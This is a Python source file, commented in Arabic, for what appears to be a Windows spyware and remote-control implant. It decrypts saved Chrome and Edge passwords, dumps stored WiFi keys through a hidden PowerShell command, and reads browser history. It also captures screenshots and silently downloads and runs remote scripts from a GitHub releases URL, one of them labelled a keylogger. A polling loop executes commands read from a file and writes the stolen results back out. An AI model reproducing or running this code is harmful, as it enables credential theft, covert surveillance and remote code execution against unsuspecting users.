import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt
from Crypto.Cipher import AES
from PIL import ImageGrab

CREATE_NO_WINDOW = 0x08000000

# إعدادات القناة الثابتة
BASE_DIR = r"C:\ProgramData\WinExec"
CMD_FILE = os.path.join(BASE_DIR, "cmd.txt")
RES_FILE = os.path.join(BASE_DIR, "res.txt")
SS_FILE = os.path.join(BASE_DIR, "ss.png")

def get_master_key(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    except: return None

def decrypt_password(buff, m_key):
    try:
        cipher = AES.new(m_key, AES.MODE_GCM, buff[3:15])
        return cipher.decrypt(buff[15:])[:-16].decode()
    except: return f"Hash: {base64.b64encode(buff).decode()}"

def run_passwords():
    out = ""
    user_p = os.path.expanduser('~')
    browsers = {"Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data", "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data"}
    for name, path in browsers.items():
        db, st = path + r"\Default\Login Data", path + r"\Local State"
        if os.path.exists(db):
            out += f"\n--- {name} Passwords ---\n"
            try:
                m_key = get_master_key(st)
                tmp = os.path.join(os.environ["TEMP"], "tmp_p.db")
                shutil.copyfile(db, tmp)
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for row in cur.fetchall():
                    if row[1].strip():
                        out += f"🌐 Site: {row[0]}\n📧 User: {row[1]}\n🔑 Pass: {decrypt_password(row[2], m_key)}\n---\n"
                conn.close(); os.remove(tmp)
            except Exception as e: out += f"Err {name}: {e}\n"
    return out or "No Passwords Found."

def run_wifi():
    try:
        # هذا الأمر يجلب كل الشبكات وكلمات السر دفعة واحدة
        cmd = 'netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $name = $_.ToString().Split(":")[1].Trim(); $key = (netsh wlan show profile name=$name key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim(); "SSID: $name | Pass: $key" }'

        
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True,
            text=True,
            encoding="cp850",
            creationflags=CREATE_NO_WINDOW
        ).stdout
        return res if res.strip() else "No WiFi profiles found."
    except:
        return "⚠️ Error retrieving WiFi or No saved networks."

def run_history():
    out = ""
    user_p = os.path.expanduser('~')
    paths = {"Edge": user_p + r"\AppData\Local\Microsoft\Edge\User Data\Default\History", "Chrome": user_p + r"\AppData\Local\Google\Chrome\User Data\Default\History"}
    for b, p in paths.items():
        if os.path.exists(p):
            out += f"--- {b} History ---\n"
            tmp = os.path.join(os.environ["TEMP"], "h_tmp")
            shutil.copyfile(p, tmp)
            try:
                conn = sqlite3.connect(tmp); cur = conn.cursor()
                cur.execute("SELECT title, url FROM urls ORDER BY last_visit_time DESC LIMIT 15")
                for r in cur.fetchall(): out += f"🔹 {r[0][:50]}\n🔗 {r[1]}\n\n"
                conn.close(); os.remove(tmp)
            except: pass
    return out

import os
import requests
import subprocess
from pathlib import Path
import time

# --- إعداد المسارات ---
CROSSMOS_PATH = Path(r"C:\ProgramData\WinCore\wincore.py")
CROSSMOS_URL  = "https://github.com/anaslabrini/crossmos/releases/download/v1.0/wincore.py"
PYTHON_EXEC   = Path(r"C:\ProgramData\WinCore\pywin.exe")

def update():
    try:
        # حذف CMD_FILE لتجنب التكرار
        if os.path.exists(CMD_FILE):
            os.remove(CMD_FILE)
        # 1️⃣ حذف الملف القديم إذا كان موجودًا
        if CROSSMOS_PATH.exists():
            CROSSMOS_PATH.unlink()
            print("[+] Deleted old crossmos.py")

        # 2️⃣ تحميل النسخة الجديدة
        r = requests.get(CROSSMOS_URL, timeout=30)
        if r.status_code != 200 or len(r.content) < 100:
            print("[!] Failed to download the new crossmos.py")
            return

        # كتابة الملف الجديد في المسار المناسب
        with open(CROSSMOS_PATH, "wb") as f:
            f.write(r.content)
        print("[+] Downloaded new crossmos.py successfully")

        # 3️⃣ تشغيل crossmos.py باستخدام python_platform.exe بصمت
        subprocess.Popen(
            [str(PYTHON_EXEC), str(CROSSMOS_PATH)],
            cwd=str(CROSSMOS_PATH.parent),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x08000000  # CREATE_NO_WINDOW
        )
        print("[+] crossmos.py launched successfully")

    except Exception as e:
        print(f"[!] Update failed: {e}")


def download_and_run(
    github_raw_url="https://github.com/anaslabrini/crossmos/releases/download/v1.0/syskey.py",
    base_dir=r"C:\ProgramData\SysKey",
    script_name="syskey.py",
    source_python=r"C:\ProgramData\WinCore\pywin.exe",
    local_python_name="pwiny.exe"
):
    import os
    import shutil
    import requests
    import subprocess

    script_path = os.path.join(base_dir, script_name)
    local_python_path = os.path.join(base_dir, local_python_name)
    pid_file = os.path.join(base_dir, f"{script_name}.pid")

    # ---------- helpers ----------
    def is_process_running(pid):
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False

    def save_pid(pid):
        with open(pid_file, "w") as f:
            f.write(str(pid))

    def load_pid():
        if os.path.exists(pid_file):
            with open(pid_file, "r") as f:
                return int(f.read().strip())
        return None

    # ---------- logic ----------
    # إنشاء المجلد إن لم يكن موجود
    if not os.path.exists(base_dir):
        os.makedirs(base_dir)

    # نسخ platform.exe إن لم يكن موجود محليًا
    if not os.path.exists(local_python_path):
        if not os.path.exists(source_python):
            return  # المصدر غير موجود
        shutil.copy2(source_python, local_python_path)

    # تحميل السكربت فقط إن لم يكن موجود
    if not os.path.exists(script_path):
        r = requests.get(github_raw_url)
        r.raise_for_status()
        with open(script_path, "wb") as f:
            f.write(r.content)

    # لا تشغّل إن كان يعمل
    pid = load_pid()
    if pid and is_process_running(pid):
        return

    # تشغيل صامت بدون CMD
    proc = subprocess.Popen(
        [local_python_path, script_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

    save_pid(proc.pid)

def stop_script(
    base_dir=r"C:\ProgramData\SysKey",
    script_name="syskey.py",
    local_python_name="pwiny.exe"
):
    import os
    import signal
    import subprocess

    pid_file = os.path.join(base_dir, f"{script_name}.pid")

    # -------- helpers --------
    def is_process_running(pid):
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False

    # -------- 1) إيقاف عبر PID (إن وُجد) --------
    if os.path.exists(pid_file):
        try:
            with open(pid_file, "r") as f:
                pid = int(f.read().strip())

            if is_process_running(pid):
                os.kill(pid, signal.SIGTERM)

            os.remove(pid_file)
        except Exception:
            pass

    # -------- 2) إيقاف احتياطي بالاسم (تأكيد نهائي) --------
    # قتل py_al.exe
    subprocess.run(
        ["taskkill", "/F", "/IM", local_python_name],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # قتل أي python يشغّل crossmoss2.py
    subprocess.run(
        ["taskkill", "/F", "/FI", f"WINDOWTITLE eq *{script_name}*"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

def remove_script(
    base_dir=r"C:\ProgramData\SysKey",
    script_name="syskey.py",
    local_python_name="pwiny.exe"
):
    import os
    import subprocess
    import signal

    script_path = os.path.join(base_dir, script_name)
    local_python_path = os.path.join(base_dir, local_python_name)
    pid_file = os.path.join(base_dir, f"{script_name}.pid")

    # -------- helpers --------
    def is_process_running(pid):
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False

    # -------- 1) إيقاف عبر PID --------
    if os.path.exists(pid_file):
        try:
            with open(pid_file, "r") as f:
                pid = int(f.read().strip())

            if is_process_running(pid):
                os.kill(pid, signal.SIGTERM)
        except Exception:
            pass

        try:
            os.remove(pid_file)
        except Exception:
            pass

    # -------- 2) إيقاف احتياطي بالاسم --------
    subprocess.run(
        ["taskkill", "/F", "/IM", local_python_name],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    subprocess.run(
        ["taskkill", "/F", "/FI", f"WINDOWTITLE eq *{script_name}*"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # -------- 3) حذف الملفات --------
    for path in (script_path, local_python_path):
        if os.path.exists(path):
            try:
                os.remove(path)
            except Exception:
                pass

    # -------- 4) حذف المجلد إن كان فارغًا --------
    try:
        if os.path.exists(base_dir) and not os.listdir(base_dir):
            os.rmdir(base_dir)
    except Exception:
        pass



# حلقة المراقبة الصامتة
from PIL import ImageGrab
import pygetwindow as gw
import os, time

if not os.path.exists(BASE_DIR):
    os.makedirs(BASE_DIR)

while True:
    if os.path.exists(CMD_FILE):
        try:
            with open(CMD_FILE, "r") as f:
                cmd = f.read().strip()

            res = ""

            if cmd == "passwords":
                res = run_passwords()

            if cmd == "keylogger":
                res = download_and_run()

            if cmd == "stopkeylogger":
                res = stop_script()

            if cmd == "rmkeylogger":
                res = remove_script()

            elif cmd == "wifi":
                res = run_wifi()

            elif cmd in ["history", "browser"]:
                res = run_history()

            elif cmd == "update":
                res = update()

            # 📸 Screenshot كامل الشاشة (كما هو بدون تغيير)
            elif cmd == "screenshot":
                ImageGrab.grab().save(SS_FILE)
                res = "SCREENSHOT_DONE"

            # 🎯 Screenshot للنافذة النشطة فقط (الجديد)
            elif cmd == "screenshot_active":
                window = gw.getActiveWindow()
                if window:
                    bbox = (window.left, window.top, window.right, window.bottom)
                    ImageGrab.grab(bbox=bbox).save(SS_FILE)
                    res = "SCREENSHOT_ACTIVE_DONE"
                else:
                    res = "NO_ACTIVE_WINDOW"

            with open(RES_FILE, "w", encoding="utf-8") as f:
                f.write(res)

            os.remove(CMD_FILE)  # مسح الطلب بعد التنفيذ

        except:
            pass

    time.sleep(1)
